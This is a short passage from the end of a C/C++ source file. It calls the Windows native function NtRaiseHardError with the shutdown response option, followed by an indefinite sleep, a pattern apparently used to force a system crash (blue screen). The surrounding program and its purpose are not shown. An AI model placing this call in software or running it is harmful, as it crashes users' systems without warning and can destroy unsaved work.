            NtRaiseHardError(0xC0000251, 0, 0, 0, 6, &response);
Sleep(-1);

return 0;
        }
    }
}